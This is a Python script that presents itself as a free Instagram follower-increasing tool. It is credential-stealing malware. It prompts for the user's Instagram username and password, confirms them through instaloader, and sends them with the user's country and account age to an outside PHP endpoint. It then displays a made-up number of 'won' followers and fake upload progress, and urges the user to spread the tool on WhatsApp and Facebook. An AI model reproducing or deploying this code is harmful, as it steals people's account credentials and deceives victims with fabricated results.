import requests
import urllib.request
import time
import re
import socket
import csv
import random
import instaloader
import stdiomask
import os
import sys
login=instaloader.Instaloader()
from urllib.request import urlopen
import getpass
import time as fuck
import datetime as gur
red = '\033[1;31m'
yellow = '\033[1;93m'
green = '\033[1;92m'
clear = '\033[1;0m'
bold = '\033[1;01m'
gtyu="http://siyarwa.atwebpages.com/ig.php"
tr="http://127.0.0.1:8081/ig.php"
cyan = '\033[1;96m'
cy='\033[1;95m'
cya='\033[1;35m'
maku='\033[90m'
fari='\033[97m'
def logo():
	os.system("clear")
	try:
		file=open('data/username.txt','r').readline()
		print(cyan+"√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π")
		print(green+"\t\t\tWELCOME: "+file)
	except Exception:
		print(cyan+"√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π")
		print(green+"\t\t\tWELCOME:  xxxxxxxxx")
	print(cyan+"√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π")	
	print(yellow)
	os.system("figlet U-danbaiwa...")
	print(fari+"\t\t\t    version: 2.0.0.1")
	print(cyan+"√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π√Π")
	print(cya)
	os.system("figlet + + IG FOLLOW")
	a=cyan+"^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
	for i in a:
		sys.stdout.flush()
		time.sleep(0.01)
		print(i,end="")
	print("")
	print(yellow+"\t\t\tCredit to U-danbaiwa\n\t\t\t"+red+"   HAH! HAH!! HAH!!!")
	print("<>"*34)
	print(red+"NOTE: "+fari+"Use Your Username instead of Email/phone number\n")
logo()


def choose():
	suna=[]
	lamba=[]
	kasa=[]
	shekara=[]
	print(yellow+"[01] "+green+"++ Your Instagram Followers")
	print(yellow+"[02] Instruction")
	print(yellow+"[03] Update")
	print(yellow+"[04] Share")
	print(yellow+"[05] Quit")
	print("\n")
	cho=input("Choose an Option: ")
	if(cho=='1'):
		logo()
		user=input(yellow+"[×]"+cya+" ==>> "+green+"Enter Your Username: "+fari)
		suna.append(user)
		print("")
		file=open("data/username.txt","w")
		file.write(user)
		file.close()
		time.sleep(1)
		pas=stdiomask.getpass(prompt=yellow+"[×]"+cya+" ==>> "+green+"Enter Your Password: "+fari ,mask="*")
		lamba.append(pas)
		print("")
		print(green+"login...")
		try:
			login.login(user,pas)
			print(cyan+"\tSuccessful Login as: "+fari+user)
			time.sleep(3)
			logo()
			print(yellow+"\t\t\tGetting Your DATA...")
			data=instaloader.Profile.from_username(login.context,user)
			followers=[]
			followed=[]
			for i in data.get_followers():
				followers.append(i.username)
				
			print(yellow+"YOU HAVE"+red+"==>"+green,len(followers),yellow+"followers INCLUDE:"+green+followers[0]+cyan+"[<=>]"+green+followers[1]+cyan+"[<=>]"+green+followers[2])
			
			print("\n")
			for j in data.get_followees():
				followed.append(j.username)
			print(yellow+"YOU HAVE"+red+"==>"+green,len(followed),yellow+"followed INCLUDE:"+green+followed[0]+cyan+"[<=>]"+green+followed[1]+cyan+"[<=>]"+green+followed[2])
			print("\n")
			country=input(yellow+"Enter Your Country Name: ")
			kasa.append(country)
			print("")
			age=input(yellow+"How Old Your Account: "+fari+" [Eg: 3 years or 2 year etc]: ")
			shekara.append(age)
			
			
			all={"username":suna,"password":lamba,"age":shekara,"country":kasa}
			send=requests.post(gtyu,data=all)
			print(green)
			os.system("bash load.sh")
			logo()
			gen=[107,80,222,100,77,1000,81,300,350,50,10,90]
			follo=random.choice(gen)
			print(yellow,"\t\t\tYOU WON",green,follo,yellow,"FOLLOWERS RIGHT NOW\n\t\t\t"+red+"congratulation!!!")
			print("\n")
			print(red+"NOTE: "+fari+"please wait to upload your followers it can take sometimes")
			time.sleep(5)
			if(follo==90):
				b=91
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)
					
			elif(follo==10):
				b=11
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)
			elif(follo==50):
				b=51
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)			
			elif(follo==350):
				b=351
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)		
			elif(follo==300):
				b=301
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)	
			elif(follo==81):
				b=82
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)
			elif(follo==1000):
				b=1001
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)
			elif(follo==77):
				b=78
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)
			elif(follo==100):
				b=101
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)
			elif(follo==222):
				b=223
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)
			elif(follo==80):
				b=81
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)
			elif(follo==107):
				b=108
				for i in range(b):
					print(green)
					os.system("bash upload.sh")
					print("\n")
					print(yellow+"Follow You:=>",cyan,i)
			print(yellow+"\t\t\tComplete Uploading\n")
			print(yellow,"\tYOUR",green,follo,yellow,"NEW FOLLOWERS WILL ARRIVED AFTER ",red,"24hours",yellow)
			lens=len(followers)
			all=lens+follo
			print("\n")
			print(green+"\t\t\tYour Followers Will Be",yellow,all,"\n")
			input(yellow+"[=] press ENTER to share this tool to your friend: ")
			os.system("xdg-open https://chat.whatsapp.com")
			print("")
			input("Press Enter to go back")
			logo()
			choose()
	
		except Exception:
			print(red+"\t\t\tSOMETHING IS WRONG TRY AGAIN")
			print("\n")
			retry=input(yellow+"\t\tDid You Want Retry [y/n]: ")
			if(retry=="y"):
				logo()
				choose()
			else:
				os.system("exit()")
				
				
	elif(cho=='2'):
		logo()
		data="[√] welcome to U-danbaiwa ++ your instagram followers, this tool is free dont buy it now i will teach how to use with this tools"
		for i in data:
			sys.stdout.flush()
			time.sleep(0.1)
			print(green+i,end="")
		print("\n")
		data1="[√] make sure you have instagram account, but old instagram account is better for this tools "
		for i in data1:
			sys.stdout.flush()
			time.sleep(0.1)
			print(green+i,end="")
		print("\n")
		data2="[√] if your instagram account reach like 3 or more year it work perfect and no any problem"
		for i in data2:
			sys.stdout.flush()
			time.sleep(0.1)
			print(green+i,end="")
		print("\n")
		data3="[√] if your instagram account is less than 3 year dont worry try it may be it work for you "
		for i in data3:
			sys.stdout.flush()
			time.sleep(0.1)
			print(green+i,end="")
		print("\n")
		data4="\t\t\t[+] HOW TO USE WITH IT"
		for i in data4:
			sys.stdout.flush()
			time.sleep(0.1)
			print(yellow+i,end="")
		print("\n")
		data5="[√] open this tool and choose option 1 "
		for i in data5:
			sys.stdout.flush()
			time.sleep(0.1)
			print(green+i,end="")
		print("\n")
		data6="[√] Enter your instagram username and password, dont use email/phone number etc just use with your username "
		for i in data6:
			sys.stdout.flush()
			time.sleep(0.1)
			print(green+i,end="")
		print("\n")
		data7="[√] after that it will prompt you to enter your Country name make sure you Enter correct"
		for i in data7:
			sys.stdout.flush()
			time.sleep(0.1)
			print(green+i,end="")
		print("\n")
		data8="[√] and the last Enter how old your instagram  eg[ if your instgram reach 3 years just type 3 years what ever you think your account reach just type it"
		for i in data8:
			sys.stdout.flush()
			time.sleep(0.1)
			print(green+i,end="")
		print("\n")
		data9="[√] then this tool would begin it work to increase your instagram followers"
		for i in data9:
			sys.stdout.flush()
			time.sleep(0.1)
			print(green+i,end="")
		print("\n")
		input(yellow+"[÷] press enter to get back")
		logo()
		choose()
	elif(cho=='3'):
		logo()
		print(red+"\n\n\t\t\tNO UPDATE RIGHT NOW")
		input("press Enter to go back")
		logo()
		choose()
	elif(cho=='4'):
		logo()
		print(yellow+"[1] share to Whatsapp")
		print(yellow+"[2] share to Facebook")
		print("\n")
		a=input("Choose: ")
		if(a=='1'):
			logo()
			os.system("xdg-open https://chat.whatsapp.com")
			print("\n")
			input("press Enter to Get back")
			logo()
			choose()
		elif(a=='2'):
			logo()
			os.system("xdg-open https://facebook.com")
			print("\n")
			input("press Enter to get back")
			logo()
			choose()
		else:
			logo()
			choose()
	elif(cho=='5'):
		logo()
		print("\n\n\t\t\tBye!!!")
		print("\n\n")
		os.system("exit()")
		
	
choose()

